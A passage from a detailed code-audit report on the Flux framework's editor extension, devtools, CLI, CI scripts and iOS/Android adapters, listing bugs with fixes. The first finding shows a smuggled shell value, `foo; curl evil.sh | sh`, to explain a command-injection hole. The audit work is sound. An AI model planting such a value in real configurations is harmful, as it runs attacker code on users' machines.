- `term.sendText(\`${devBin} dev --ws-host 0.0.0.0\`)` passes the per-workspace, repo-committable `flux.lspServerPath` through the user's shell — a malicious repo can set it to `foo; curl evil.sh | sh` and gain command execution when the user runs the promoted command. (The `0.0.0.0` exposure itself compounds §6's unauthenticated patch channel.)
- Fix: resolve the binary with `vscode.Uri`/`PATH` checks and pass arguments structurally, at minimum quote: `term.sendText(\`${JSON.stringify(devBin)} dev --ws-host 0.0.0.0\`)`.

### [🟡 MEDIUM] PERF — Component tree rebuilds the full model per keystroke and triple-clones every node per render
- File: `crates/flux-devtools-ui/src/views/component_tree.rs` : 132-187, 270-287, 297-303
- `tree()` clones the entire `ReconstructedState` (134), then every `ViewFrame` again into the children map (140), then a third time in `build` (156) — per render. The search box has **no debounce** (each `InputEvent` → `cx.notify()` → full rebuild; the comment at : 306 claiming "debounced filter" is false).
- Fix: store frames as `Arc<[ViewFrame]>`/indices; skip the rebuild when the query is unchanged; debounce via `cx.defer`/150 ms timer. Replace `[DT-COLLAPSE]`/`[DT-TREE]` `eprintln!` probes with `tracing::debug!`.

### [🟡 MEDIUM] PERF — Every telemetry event is reconstructed twice and cloned twice; timeline re-sorts 1 024 records per frame
- Files: `crates/flux-devtools-ui/src/state.rs` : 380-398, 447-451, 464-466; `crates/flux-devtools-ui/src/views/timeline.rs` : 100; `crates/flux-devtools-ui/src/perf_record.rs` : 66-104, 240-247
- `handle_telemetry` reconstructs into the active `DeviceSession.live` **and** the legacy `live` mirror and pushes a clone into both timelines — 2× reconstruction + 2× deep event clones per event, while all six views only read the legacy fields. Timeline render clones the whole perf `Vec` (up to 1 024 records) every frame and each `FlameRow` recomputes `p50/p95/p99` (three sorts) from unchanged data.
- Fix: make the legacy mirror a lazily computed view over `sessions` (or migrate the views and delete it); cache `Vec<FlameRow>` keyed on `(perf_record_count, last record)`; sort samples once per record.

### [🟡 MEDIUM] DESIGN — Multi-host sessions are dead wiring; VM pause state is provably dead
- Files: `crates/flux-devtools-ui/src/state.rs` : 126-133, 171-172, 263, 354-398; `crates/flux-devtools-ui/src/time_travel/reconstruct.rs` : 161-165
- `DeviceSession::state_at` has **zero callers**; `session_keys`/`session_count` are exercised only by tests; all views render the legacy single-host fields while a parallel per-host model is maintained and never shown (doubling per-event work). `is_paused`/`paused` can never become true — `TelemetryEvent` has no pause/resume variant, and `reconstruct_state`'s `HandlerInvocation { is_start: true } => state.paused = false` is a no-op dressed up as logic.
- Fix: either surface `sessions` in the UI (host picker) or remove them until the wire tags events with a source host; delete the pause fields until the protocol emits pause telemetry.

### [🟡 MEDIUM] DESIGN — Perf gate silently passes any `MetricKind` missing from the fixed 8-slot budget array
- File: `crates/flux-perf-harness/src/gate.rs` : 16, 26-39, 45-50, 70-81
- `Budgets` stores `[(MetricKind, f64); 8]`; `ceiling_for` returns `None` for unknown kinds and `evaluate` then returns `passed: true`. When a new `MetricKind` variant is added (FLUX-073 already added one), the CI gate silently skips it — the opposite of the gate's purpose.
- Fix: replace the array with an exhaustive `match` in `ceiling_for` so adding a variant is a compile error.

### [🟡 MEDIUM] SMELL — Theme-blind hardcoded white colors in shared rows and the flamegraph; stale backup example
- Files: `crates/flux-devtools-ui/src/row.rs` : 29-30, 58; `crates/flux-devtools-ui/src/perf_record.rs` : 128-132, 154, 163-170; `crates/flux-devtools-ui/examples/flux_examples_bak/host_emulator.rs` : 1-157
- `kv_row` borders and empty/flamegraph text use `gpui::white().opacity(...)` instead of theme tokens — in light mode (explicitly supported, `app.rs` : 431-443) they're white-on-white invisible. `examples/flux_examples_bak/` is a near-verbatim pre-refactor copy that will rot and mislead.
- Fix: swap to `cx.theme()` tokens (thread `&App` into `row.rs` helpers); `git rm -r crates/flux-devtools-ui/examples/flux_examples_bak/`.

### [🔵 LOW] BUG — Semantic-token comment scanner misclassifies strings with escaped backslashes/quotes
- File: `crates/flux-lsp/src/semantic_tokens.rs` : 128-150
- `in_string` toggles on `"` unless the previous byte is `\\`, so `"a\\"` flips state incorrectly and subsequent `//` gets misclassified until the next quote.
- Fix: count preceding backslashes properly (odd count = escaped) or reuse the lexer's string spans to mask comment detection.

### [🔵 LOW] BUG — `LatencyMs` accepts negative and infinite values; doc claims it can't; assert panics in library code
- File: `crates/flux-perf-harness/src/metric.rs` : 19-36, 219-247
- The type's stated purpose is "a negative or `NaN` value can never silently enter a record", but `from_raw` only asserts `!is_nan`; serde deserialization bypasses the assert entirely; the assert is a `panic!` reachable from any library caller. `approx_eq` is justified by a false premise (serde_json round-trips `f64` bit-exactly via ryu).
- Fix: checked constructor `pub fn from_raw(value: f64) -> Result<Self, MetricError>` + custom serde deserializer validating `is_finite() && >= 0.0`; delete `approx_eq` or correct its doc.

### [🔵 LOW] PERF — LSP re-parses (and type-checks) the full document on every hover/definition request
- File: `crates/flux-lsp/src/lib.rs` : 468-482, 502-513
- `definition` and `hover` each call `flux_parser::parse` (hover additionally `flux_types::type_check`) with no cache — every cursor move rebuilds the whole model, undoing the diagnostics debounce.
- Fix: cache `Arc<(u32 /*version*/, Ast, Option<TypedAST>)>` per URI, invalidated in `did_change`/`did_open`, shared across providers.

### [🔵 LOW] PERF — O(n) `Vec::remove(0)` evictions in three ring buffers; O(n·t) semantic-token column math
- Files: `crates/flux-devtools-ui/src/time_travel/log_buffer.rs` : 101-106; `network_log.rs` : 160-163; `state.rs` : 447-451; `crates/flux-lsp/src/semantic_tokens.rs` : 94-95, 117-124
- All three bounded buffers shift the whole `Vec` per eviction while `TimelineBuffer` correctly uses a `VecDeque` — 512-element memmove per log line on the ingest path. `line_col_at` rescans the document prefix per token → quadratic highlight cost per request.
- Fix: back them with `VecDeque`; single-pass incremental `(line, line_start_byte, line_start_char)` tracking (tokens are already sorted).

### [🔵 LOW] BUG — Empty-sample records fail the CI gate with "p95 inf exceeds …"; `debug_assert!` for `sample_count`
- Files: `crates/flux-perf-harness/src/gate.rs` : 83-99; `driver.rs` : 65-68
- Zero samples → p95 = `f64::INFINITY` → baffling gate failure instead of "no samples"; `HarnessDriver::new` rejects `sample_count == 0` only in debug builds (release silently produces empty records).
- Fix: distinct verdict for no samples (`passed: false, reason: "no samples collected"`); hard `assert!(sample_count > 0)` matching the buffer constructors.

### [🔵 LOW] SMELL — Unreachable `registers.is_empty()` branch; completion provider ignores cursor; entry-gas magic number
- Files: `crates/flux-devtools-ui/src/views/vm_inspector.rs` : 63-76, 101-103; `crates/flux-lsp/src/completion.rs` : 21-33; `crates/flux-lsp/src/goto_def/index.rs` : 249-268
- `VmState.registers` is `Box<[Value; 16]>` — the empty-state branch is dead. `completions_at(_text, _cursor)` returns the full registry regardless of position (mid-string, mid-keyword). `ENTRY_GAS: f32 = 100_000.0` re-encodes the VM's budget as a UI-side magic number that drifts silently if the VM changes.
- Fix: delete the dead branch; suppress completions inside strings/comments via the lexer and scope to prop-name positions; carry the entry budget in `VmStep` telemetry and compute the gauge from the wire.

### [🔵 LOW] SMELL — `runOnDevice` derives the dev binary from the LSP setting; per-call `OutputChannel` leak; package.json category drift
- Files: `editors/vscode/src/extension.ts` : 85-91; `editors/vscode/package.json` : 10-14
- `devBin = fluxBin.replace(/flux-lsp$/, "flux")` overloads the LSP setting to also locate `flux` (wrapper scripts silently break it); `createOutputChannel("Flux")` is called per invocation and never disposed. `categories` claims "Formatters" but no formatter is registered.
- Fix: dedicated `flux.devServerPath` setting; hoist one `OutputChannel` into `activate` + `context.subscriptions`; drop "Formatters".

### [⚪ NIT] — Timeline slider `SliderValue` range fallback to 0; debounce spawns one timer per keystroke; `word_at` ASCII-only
- Files: `crates/flux-devtools-ui/src/views/timeline.rs` : 51-54; `crates/flux-lsp/src/lib.rs` : 180-211; `crates/flux-lsp/src/goto_def/index.rs` : 249-268
- `_ => 0` maps any range-style slider value to index 0 — return `None` and early-out instead. The did_change debounce clones the text and spawns a 50 ms task per keystroke — keep one `JoinHandle` per URI and `abort()` the previous. `is_ident_byte` assumes ASCII identifiers — document it or use `char::is_alphanumeric()`.
---

## 10. CLI, website, stdlib, scripts, gradle

*Reviewed end-to-end by audit pass A3; anchors verified.*

### [🔴 CRITICAL] BUG — Trace fixture generator collapses arrays; homepage player crashes on step
- Files: `website/scripts/make-fixtures.ts` : 37-45, 58-60; `website/src/assets/traces/counter-init.jsonl` : 5-6; `website/src/components/DispatchTracePlayer.tsx` : 113, 122
- `canonicalLine` serializes every non-string value with `String(v)`. For arrays `String([1]) === "1"`, so the `signals`/`dirty` events are emitted as `"ids":1` instead of `"ids":[1]` — the committed fixture confirms the corruption. At hydration of step ≥ 1, `DispatchTracePlayer` executes `ev.ids.forEach(...)` on a number → `TypeError` → the marquee homepage island crashes the moment a user clicks "Step ▶".
- Fix:
```ts
return `"${k}":${JSON.stringify(v)}`;
```
regenerate the fixture (`pnpm make:fixtures`), and harden the player: `if (ev.t === 'dirty' && Array.isArray(ev.ids)) ...` (same for `signals`).

### [🟠 HIGH] BUG — i18n key mismatch renders every trace-player label empty
- Files: `website/src/components/DispatchTracePlayer.tsx` : 42-59, 96-99; `website/src/content/docs/index.mdx` : 23, 79-84 (and es/fr equivalents)
- The component expects bare keys (`i18n.title`, `i18n.step`, …) but `getTranslation` returns flat dictionaries whose keys are all prefixed (`"tracePlayer.title"`). All three `index.mdx` files pass the raw dictionary, so every heading, button label, pane title and stat label renders `undefined`/empty in en, es and fr. `Record<string,string>` is assignable to the `I18nStrings` prop type, so `astro check` cannot catch it.
- Fix: add a typed helper in `i18n-helper.ts`:
```ts
export function getTracePlayerStrings(locale: Locale): I18nStrings {
  const d = getTranslation(locale);
  return Object.fromEntries(
    Object.entries(d).filter(([k]) => k.startsWith('tracePlayer.'))
      .map(([k, v]) => [k.slice('tracePlayer.'.length), v])) as I18nStrings;
}
```

### [🟠 HIGH] BUG — FLUX-087 forbidden-call gate can never detect `panic!`
- File: `scripts/ci-size-gate.sh` : 223, 227 (also 240, 245 in the Swift/Kotlin variant)
- The pattern `\b(unwrap|expect|panic!)\b` requires a word boundary **after** the alternation; `panic` ends in a word char but the match ends at `!` (non-word), so the trailing `\b` demands a word char after `!` — which fails for the canonical `panic!("...")`. Verified empirically: `printf 'fn f() { panic!("x"); }' | grep -cE '\b(unwrap|expect|panic!)\b'` → `0`. The gate never flags `panic!`, silently weakening AGENTS.md §2.1 enforcement.
- Fix:
```bash
grep -nE '\b(unwrap|expect)\s*\(|\bpanic!\s*\(' "$f"
```

### [🟠 HIGH] BUG — `flux lsp --types` can never be disabled; documented fast path is dead
- File: `crates/flux-cli/src/lib.rs` : 108-117
- `#[arg(long, default_value_t = true)] types: bool` compiles to a `SetTrue` flag defaulting to `true`. Omitting `--types` yields `true`; passing `--types` yields `true`. There is no way to reach the documented parse-only fast path, and the integration tests only cover `types=true`.
- Fix:
```rust
/// Disable the type-checker (parse diagnostics only — fast path for large files).
#[arg(long = "no-types", action = clap::ArgAction::SetTrue)]
no_types: bool,
// lsp::run(&file, !no_types)
```

### [🟡 MEDIUM] BUG — `flux init` hardcodes `name = "myapp"` in the generated config
- File: `crates/flux-cli/src/init.rs` : 49-57
- `SAMPLE_CONFIG` is a `const` containing `name = "myapp"` — scaffolding `flux init blog-app` creates a project whose `[project] name` is `"myapp"`.
- Fix:
```rust
let config = format!("[project]\nname = \"{name}\"\nentry = \"main.flux\"\n\n[dev]\nws_port = 7331\nhttp_port = 7332\n");
write_file(root, CONFIG_FILE, &config)?;
```

### [🟡 MEDIUM] BUG — run-perf-harness aborts silently when the iOS test emits no record
- File: `scripts/run-perf-harness.sh` : 18, 70-74
- With `set -euo pipefail`, `xcodebuild test ... | grep 'RENDER_PERF' >> "$RECORDS_FILE"` kills the whole script (no message, no summary) whenever `xcodebuild` exits non-zero **or** the suite succeeds but prints no `RENDER_PERF` line. The skip/gate logic in step 3/3 is then never reached. The Android path guards with `|| true`; the iOS path does not.
- Fix: `{ xcodebuild test ... 2>&1 || true; } | grep 'RENDER_PERF' >> "$RECORDS_FILE" || true`

### [🟡 MEDIUM] BUG — wire-fixtures gate pins a machine-specific simulator UDID
- File: `scripts/wire-fixtures-gate.sh` : 75-80
- The Swift decoder runs against `-destination 'platform=iOS Simulator,id=27088715-…'` — a hard-coded author-machine UDID. On any other machine the gate reports FAIL instead of SKIP.
- Fix: `-destination 'platform=iOS Simulator,name=any'` or discover a booted sim via `xcrun simctl list devices booted`.

### [🟡 MEDIUM] BUG — `flux doctor` stdlib parse check fails open as "[ok]"
- File: `crates/flux-cli/src/doctor/probe.rs` : 49-77
- The check scripts are resolved against the **process CWD**; run from a scaffolded project (the normal case) neither exists and the probe reports a green "Stdlib parse-check … modules registered" that verified nothing. `Command::output()` has no timeout — the underlying `cargo test` blocks `flux doctor` for minutes on a cold cache.
- Fix: resolve against the located workspace root (same walk-up as `agents_rules::workspace_root`); return a dedicated "skipped" status (not `ok`) when it cannot run; bound the child with a timeout loop (`try_wait` + deadline).

### [🟡 MEDIUM] BUG — doctor prints the approved ceiling twice on drift lines
- File: `crates/flux-cli/src/doctor/mod.rs` : 157-162 (and 199-202)
- `"  - {} {} resolved {} — {} (approved {})"` is passed `d.approved` both as the second field and the trailing `(approved …)`. The parallel `advisory_findings` uses yet another ordering.
- Fix: one canonical format: `println!("  - {} approved {} resolved {} — {}", d.name, d.approved, d.resolved, d.warning);` reused by both listings.

### [🟡 MEDIUM] BUG — CI ownership/size gates fail open on shallow clones
- Files: `scripts/ci-size-gate.sh` : 84-90; `scripts/check-ownership.sh` : 48-53
- When `origin/main` cannot be resolved, both scripts fall back to `${HEAD_REF}~1`, and if that also fails they set `MERGE_BASE=$HEAD_REF` — `git diff HEAD HEAD` is empty → the delta gates pass vacuously. Shallow CI checkouts (common for first-time forks) silently disable the guards.
- Fix: fail closed when neither ref resolves:
```bash
MERGE_BASE="$(git rev-parse "${HEAD_REF}~1" 2>/dev/null)" || { echo "::error::cannot resolve merge base" >&2; exit 2; }
```

### [🟡 MEDIUM] BUG — docs-coverage gate claims to run in `pnpm build` but is not wired; would fail with ~18 missing pages
- Files: `website/scripts/check-docs-coverage.ts` : 14; `website/package.json` : 9
- The header says "invoked during `pnpm build`" but `build` is `astro build && pnpm run check:i18n` — the coverage script never runs. If wired today it would fail: 25 components derived from `stdlib/*.flux` vs 8 cookbook pages.
- Fix: either add `&& pnpm run check:coverage` and land the missing pages, or correct the header and track the gap as an explicit exemption list (like `check-i18n-drift.ts`).

### [🟡 MEDIUM] BUG — stdlib prop-contract audit ignores its parameter and carries dead Panel entries
- File: `scripts/check-stdlib-props.py` : 104-141, 162, 228-258, 305-307
- `scan_kotlin(kotlin_dir)` ignores its argument and hardcodes the real path; `main()` passes a directory that is never used; `PANEL`→`Panel` and `PanelAdapter.swift` reference components/files that do not exist anywhere.
- Fix: drop the parameter (or honor it), delete the dead rows, and fail loudly when a mapped file is missing (`assert path.exists()`).

### [🟡 MEDIUM] BUG — `Image` default contradicts its own contract; `DatePicker` bounds default to a degenerate range
- Files: `stdlib/image.flux` : 9 vs 22; `stdlib/date_picker.flux` : 14-15
- Image: the header says `resizeMode "fill" (default)` but the declaration is `resizeMode: Option[String] = None`; the vocabulary also disagrees with the prelude (`"fill"|"fit"|"stretch"` vs `ContentMode = Fit|Fill|Center`). DatePicker: `min: Int = 0, max: Int = 0` in epoch-millis means the default selectable range is the single instant 1970-01-01, with an undocumented host special-case.
- Fix: `resizeMode: Option[ContentMode] = Some(Fill)`; `min/max: Option[Int] = None` with "None = unbounded" in the contract comment.

### [🟡 MEDIUM] SMELL — `Storage.devReferenceAsync` leaks a dev-only method into the frozen capability IDL; the "async fn" convention is never used; Switch/Toggle duplicate components with divergent handler verbs; prelude declares dead types; TextInput is the only form component with a required handler
- Files: `stdlib/capabilities.flux` : 16-19, 36, 133-140; `stdlib/switch.flux` : 10-14; `stdlib/toggle.flux` : 12-16; `stdlib/prelude.flux` : 40-52; `stdlib/text_field.flux` : 18-24
- (a) The frozen `Storage` surface exposes `fn devReferenceAsync() -> Data` and **no** method anywhere is declared `async fn` despite the contract comment claiming `fn` vs `async fn` *is* the encoding of asynchrony. (b) `Switch` uses `onChange` while `Toggle` uses `onValueChange` for the same semantic — two spellings codegen/adapters/docs must special-case forever. (c) `KeyboardType`/`ContentMode` are declared but consumed by nothing (`TextInput` has no `keyboardType`; `Image.resizeMode` is `Option[String]`). (d) `TextInput(onChangeText: Handler)` is the only required handler in an otherwise-defaulted family.
- Fix: remove/rename `devReferenceAsync`; declare the awaited methods `async fn` or drop the claim; pick one verb for both components (or fold `Toggle` into `Switch`); wire the dead types into their components or delete them; default `onChangeText`.

### [🟡 MEDIUM] BUG — agents_rules function-length check never fires for methods inside impl/class bodies
- File: `crates/flux-cli/src/doctor/agents_rules.rs` : 126, 171
- Both `scan_rust` and `scan_swift_kotlin` only set `fn_start` when `depth == 0` — almost every real function lives inside an `impl`/`class` (depth ≥ 1), so the "> 40 lines (§1.2)" rule is effectively dead for the codebase it scans. The CI awk heuristic doesn't have this restriction, so doctor understates violations vs CI.
- Fix:
```rust
if is_fn_start(line) { fn_start = Some(line_no); fn_base = Some(depth); }
// on '}':
if let (Some(fs), Some(fb)) = (fn_start, fn_base) && depth == fb { /* report */ fn_start = None; }
```

### [🟡 MEDIUM] BUG — `flux build` Android toolchain resolution is broken on Windows
- File: `crates/flux-cli/src/build.rs` : 351-358, 363-379
- `find_gradlew` prefers the POSIX `gradlew` sh script and falls back to bare `"gradle"`; `which()` only tests existence (no PATHEXT, no executability). On Windows the spawn targets the sh script and fails; `which("gradle")` never matches `gradle.bat`. A stray *directory* named `gradlew` also passes.
- Fix:
```rust
let candidates: &[&str] = if cfg!(windows) { &["gradlew.bat", "gradlew"] } else { &["gradlew"] };
```
plus a metadata check that the candidate is a file.

### [🟡 MEDIUM] SEC — provision-compose caches jars in a never-cleaned shared dir without checksums or timeouts
- File: `scripts/provision-compose.sh` : 19-20, 45-58, 68
- `WORK="$HOME/compose_prov"` is reused and never pruned — after a BOM/Kotlin bump the classpath can contain **two versions** of the same Compose artifact. Downloads are checksum-free and every `curl` lacks `--max-time` (a hung CDN stalls CI until the runner timeout).
- Fix: `rm -rf "$WORK/jars" "$WORK/aars"` at start (or `mktemp -d`), `--max-time 60 --retry 2` on all curls, pin SHA-256s for the compiler jars.

### [🟡 MEDIUM] BUG — check-ownership splits filenames on whitespace; delta gate flags test-module unwraps
- Files: `scripts/check-ownership.sh` : 55-59; `scripts/ci-size-gate.sh` : 212-251
- `for file in $changed` word-splits/globs — a path with a space becomes several phantom files and can miss a protected-dir hit. The Rust delta path greps added lines for `unwrap|expect|panic!` with no `#[cfg(test)] mod tests` exclusion — a PR adding a legal test module inside a production file produces false red gates.
- Fix: `while IFS= read -r -d '' file; do ... done < <(git diff --name-only -z "$merge_base" "$head_ref")`; strip test-module line ranges (mirror `agents_rules::scan_rust` brace tracking) before the grep.

### [🔵 LOW] BUG — adb daemon banner becomes a phantom "android:*" device; source gatherer recurses through symlinks
- Files: `crates/flux-cli/src/doctor/probe.rs` : 86-95; `crates/flux-cli/src/sources.rs` : 32-53
- `adb devices` can print `* daemon started successfully *` — `line.split_whitespace().next()` yields `*` which is reported as a device. `collect_into` follows symlinked dirs with no visited set — a symlink loop stack-overflows `flux build`/`flux doc`; it also walks `.git`/`target`/`node_modules`.
- Fix: `if line.starts_with('*') { continue; }` (or parse only lines containing `\t`); `if path.is_dir() && !path.is_symlink()` and skip the standard noise dirs.

### [🔵 LOW] BUG — `fmt` derives file ids from `DefaultHasher` (see §5); ci-size-gate force-unwrap filter drops every line containing `//`
- Files: `crates/flux-cli/src/fmt.rs` : 67-75; `scripts/ci-size-gate.sh` : 240-241
- `grep -vE '//.*(!|\\?)'` — in ERE `(\\?)` matches empty, so the pattern reduces to "any line containing `//`": all force-unwrap scanning skips any line with a trailing comment.
- Fix: strip comments first (`sed 's|//.*||'`) then scan.

### [🔵 LOW] SMELL — `fix_sizegate.py` is a dead one-off codemod; wire fixture list hardcoded; dependency-drift can emit duplicate rows; astro config links ADRs to a personal fork; `flux doc`/`fmt` CWD-relative defaults; build.rs builds the Bridge twice per source and matches on generated strings
- Files: `scripts/fix_sizegate.py` : 10, 20-24; `scripts/wire-fixtures-gate.sh` : 24-29; `crates/flux-cli/src/doctor/dependency_drift.rs` : 109-125, 156-183; `website/astro.config.mjs` : 92-98; `crates/flux-cli/src/doc.rs` : 16, 25 & `lib.rs` : 125-127; `crates/flux-cli/src/build.rs` : 89-104, 119-129, 146-150
- Delete the codemod; glob `"$FIXTURES"/*.bin` instead of a fixed list; dedupe drift rows by name (`seen: HashSet`); point the sidebar at the project origin; add a `--root` to `Doc` (or locate the workspace root like `doctor` does); compute the bridge/component list once per file and expose a structured "prelude already included" flag instead of `starts_with("import SwiftUI\n")`.

### [⚪ NIT] — DispatchTracePlayer dead code + magic fixture coupling; unused version-catalog alias + hardcoded compose coordinate; doctor probes run with no timeout and swallow tool output; es/fr homepage demo sources drifted from English
- Files: `website/src/components/DispatchTracePlayer.tsx` : 135-137, 140, 190, 220-224; `gradle/libs.versions.toml` : 56 + `runtimes/android/host/build.gradle.kts` : 28; `crates/flux-cli/src/doctor/probe.rs` : 16-40, 54-70; `website/src/content/docs/{es,fr}/index.mdx` : 26-32
- Delete the empty `useEffect`, the always-`undefined` `data-locale` attribute, unused fields; compute `Count` from the trace instead of `stepIdx === 0 ? 0 : 1`; derive node layouts from the tree (BFS) instead of hardcoding ids 1/57/7. Remove the unused catalog alias via the manifest steward; add `compose-runtime` to `[libraries]`. Bound each doctor probe (10 s) and surface the first `FAIL <file>` line from parse-check stdout. Hoist `counterSrc` into one shared module imported by all three locales.

---

## 11. Native adapters — Kotlin (Android) & Swift (iOS)

*Reviewed end-to-end by audit pass A4; anchors verified. PARITY = same wire feature behaving differently per platform.*

### [🔴 CRITICAL] BUG — iOS `TextInput` can never dispatch `onChangeText`
- File: `adapters/ui-swift/Sources/FluxUIKit/TextInputAdapter.swift` : 21-24, 59-85
- The doc claims "A `UITextFieldDelegate` relays the edit," but `Delegate` (72-85) implements only `bind(...)`. After "Audit D19" removed `textFieldDidChangeSelection`, **nothing** registers for `UIControl.Event.editingChanged`, no delegate text-change callback is implemented, and no target/action is added — user edits are never forwarded to the executor. The controlled-input loop is completely dead on iOS. `Tests/FluxUIKitTests/TextInputAdapterTests.swift:28` still calls the deleted API — the suite can no longer compile, so it couldn't catch this.
- Fix:
```swift
public func create() -> UITextField {
    let field = UITextField()
    field.borderStyle = .roundedRect
    // ...existing delegate/association code...
    field.addTarget(self, action: #selector(editingChanged(_:)), for: .editingChanged)
    return field
}
@objc private func editingChanged(_ field: UITextField) {
    onTextChanged?(field.text ?? "")   // or dispatch via a stored HandlerTarget payload { .str(field.text ?? "") }
}
```
(Then repair the test suite so it compiles against the real API.)

### [🟠 HIGH] BUG — Rebinding a handler accumulates duplicate UIActions → duplicated dispatch
- Files: `adapters/ui-swift/Sources/FluxUIKit/ButtonAdapter.swift` : 43-46; `SwitchAdapter.swift` : 39-42; `ToggleAdapter.swift` : 48-51; `CheckboxAdapter.swift` : 45-48; `SliderAdapter.swift` : 47-50; `DatePickerAdapter.swift` : 48-53
- Every `bindHandler` appends a *new* `UIAction` without removing the previous one. The dev runtime re-binds on hot-swap/prop change, so after the first rebind each tap fires the handler **N times** — double signal writes, duplicated VM evaluations. The Kotlin side *replaces* the stored handler id, so the platforms diverge for the same wire sequence.
- Fix: `view.removeAction(identifiedBy: .fluxPress, for: .touchUpInside)` (or `removeAllActions()`) before each `addAction`, or store the action and replace it.

### [🟠 HIGH] BUG — Payload closures capture the control strongly → retain cycle, and `destroy()` cannot break it
- Files: `adapters/ui-swift/Sources/FluxUIKit/SwitchAdapter.swift` : 40, 44-46; `ToggleAdapter.swift` : 49, 53-55; `CheckboxAdapter.swift` : 46, 50-52; `SliderAdapter.swift` : 48, 52-54; `DatePickerAdapter.swift` : 49-51, 55-57
- The `HandlerTarget` payload closures capture `view` strongly (`.bool(view.isOn)` etc.), so `view → UIAction → target → closure → view` never deallocates. Worse, all six controls' `destroy(_:)` call `view.removeTarget(nil, action: nil, for: .allEvents)` — which removes target/action *pairs*, **not** `UIAction` registrations (those need `removeAction(_:for:)`/`removeAllActions()`), so stale actions survive destroy and keep firing.
- Fix: `public func destroy(_ view: UISwitch) { view.removeAllActions() }`, and don't capture the view in the payload — store `weak var controlledView: UISwitch?` on `HandlerTarget` and read state through it in `fire()`.

### [🟠 HIGH] PARITY — Font record size read at two different positional slots (iOS renders size 14 always)
- Files: `adapters/ui-swift/Sources/FluxUIKit/TextAdapter.swift` : 52-62; `Font.swift` : 76-82; `adapters/ui-kotlin/src/main/kotlin/dev/flux/ui/Props.kt` : 57, 77-86
- The canonical decoder (`FluxFount(record:)`, `FontField.size = 0`, weight = 1) and Kotlin `Props.getFont` (slot 0 = size, slot 1 = weight) both read size at **slot 0**. But `TextAdapter.applyFont` reads `font.getFloat(1)` — against the canonical encoding that hits the weight *string* → nil → the size silently defaults to 14 for every `Text`. `FluxFount` is dead code; weight is never applied at all.
- Fix: route the adapter through the canonical decoder:
```swift
private func applyFont(to view: UILabel, props: Props) {
    if let font = props.getRecord(named: "font").flatMap(FluxFount.init(record:)) {
        view.font = font.uiFont   // size slot 0, weight slot 1 — matches Kotlin
    }
}
```

### [🟠 HIGH] PARITY — Kotlin events always carry `nodeId = 0`; Swift events carry the real node
- Files: `adapters/ui-kotlin/src/main/kotlin/dev/flux/ui/FluxExecutor.kt` : 15-19, 30-40; `ButtonAdapter.kt` : 53-57 (same pattern in `TextInputAdapter.kt` : 50-58, `SwitchAdapter.kt` : 42-50, `GestureAdapter.kt` : 60-68, …)
- `HandlerEvent` defaults `nodeId = 0u` and `FluxAdapter.bindHandler(view, props, executor)` has no `nodeId` parameter, so no Kotlin adapter can scope an event to its node. Swift's contract is `bindHandler(_:to:nodeId:)` and `HandlerTarget` stamps every `FluxEvent`. For the same patch, Android dispatches unscoped events — server-side signal writes that rely on `nodeId` scope misbehave on Android.
- Fix: thread the node id through the Kotlin contract: `fun bindHandler(view: V, props: Props, executor: WeakReference<FluxExecutor>, nodeId: UInt)`; adapters store `PROP_NODE_ID`; the host builds `HandlerEvent(handlerId, nodeId, payload)` like Swift.

### [🟠 HIGH] BUG — `CheckboxAdapter` (iOS) dispatches the *stale* value and never toggles locally; doc says the opposite
- File: `adapters/ui-swift/Sources/FluxUIKit/CheckboxAdapter.swift` : 17, 33-48
- The doc promises "Tapping toggles `isSelected` and dispatches `onChange` with the new boolean," but the `UIAction` body only calls `target.fire()`. UIKit does not auto-toggle `isSelected` on `touchUpInside`, so the payload closure `{ .bool(view.isSelected) }` evaluates to the **pre-tap** value — the handler receives the old value and must invert it, diverging from every sibling adapter and from the Kotlin host contract.
- Fix:
```swift
view.addAction(UIAction { [weak view] _ in
    view?.isSelected.toggle()
    view?.applyGlyph()
    target.fire()
}, for: .touchUpInside)
// payload: { [weak view] in .bool(view?.isSelected ?? false) }
```

### [🟠 HIGH] BUG — `ScrollView` (iOS) children all pinned to the same four content edges (overlap); horizontal orientation is a no-op
- File: `adapters/ui-swift/Sources/FluxUIKit/ScrollViewAdapter.swift` : 42-67
- `setChildren` adds every child directly to the content host with leading/trailing/top/bottom pinned to the *same* anchors — two or more children occupy identical frames and overdraw. `orientation` is recorded "for parity" but nothing applies it: content width is permanently pinned to `frameLayoutGuide.widthAnchor` (: 37), so `"horizontal"` can never scroll — diverging from the Kotlin adapter which consumes `PROP_ORIENTATION`.
- Fix: embed a `UIStackView` in the content host (axis flipped by orientation) and reconcile children into it; pin content width only when `orientation != "horizontal"`.

### [🟡 MEDIUM] BUG — `TextArea` (iOS) writes the placeholder into the actual text content; maxLines adds a new constraint per update
- File: `adapters/ui-swift/Sources/FluxUIKit/TextAreaAdapter.swift` : 45, 46-50
- `view.text = view.text.isEmpty ? placeholder : view.text` mutates `UITextView.text` — the hint becomes the field's *value*, dispatched as user payload on the next edit and indistinguishable from typed text (every other adapter treats placeholder as a hint). And every `update` pass carrying `maxLines` activates a *new* `heightAnchor.constraint(lessThanOrEqualToConstant:)` without deactivating the previous — constraints accumulate unboundedly.
- Fix: render the hint via a fading overlay label (`placeholderLabel.isHidden = !view.text.isEmpty || view.isFocused`); keep one stored `NSLayoutConstraint` and update its `constant`.

### [🟡 MEDIUM] BUG — `Reconcile.kt` silently drops unresolvable children, tolerates duplicate ids, contradicts its contract; `ContainerAdapter.setChildren` ignores `childIds`
- Files: `adapters/ui-kotlin/src/main/kotlin/dev/flux/ui/Reconcile.kt` : 26-42; `ContainerAdapter.kt` : 37-46
- `targetIds.mapNotNull { existing[id] ?: lookup(id) }` silently drops ids whose view isn't resolvable — the final child list no longer matches the server's targetIds order/count, with no error. Duplicate ids add the same view twice. The KDoc claims "removes orphans, appends missing views, and reorders in place… through setChildAt" but the implementation clears *all* children and re-adds them. `ContainerAdapter` re-appends the `children` list in arrival order, never consulting `childIds` (the documented "visual order") — wrong order whenever arrival order differs, diverging from `ColumnAdapter`/`RowAdapter`/`RouterAdapter` and from the Swift `ContainerAdapter`.
- Fix:
```kotlin
public fun reconcileChildren(view: FluxNativeView, targetIds: KList<UInt>, lookup: (UInt) -> FluxNativeView?) {
    require(targetIds.toSet().size == targetIds.size) { "duplicate child ids: $targetIds" }
    val byId = view.children().associateBy { it.nodeId }
    val targetViews = targetIds.map { id -> byId[id] ?: lookup(id) ?: error("no view for child id $id") }
    view.clearChildren()
    targetViews.forEach { view.addChild(it) }
}
// ContainerAdapter:
override fun setChildren(view: FluxNativeView, childIds: KList<UInt>, children: KList<FluxNativeView>) {
    val byId = children.associateBy { it.nodeId }
    reconcileChildren(view, childIds) { byId[it] }
}
```

